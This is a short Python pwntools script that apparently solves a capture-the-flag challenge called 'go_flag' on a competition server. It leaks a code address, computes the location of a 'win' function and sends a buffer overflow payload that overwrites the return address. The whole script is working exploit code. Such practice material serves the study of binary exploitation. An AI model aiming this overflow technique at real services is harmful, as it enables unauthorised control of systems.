#!/usr/bin/env python3
from pwn import *

# p = process('go_flag')
p = remote('apb2021.cstec.kr', 4242)

p.sendlineafter(b': ', b'-1')

addr = int(p.recv(12), 16) - 0x120E
win = addr + 0x11e9

print(hex(addr))

raw_input('>')

payload = b'a' * 0x20
payload += p64(0x55665566)
payload += p64(win)

p.send(payload)

p.interactive()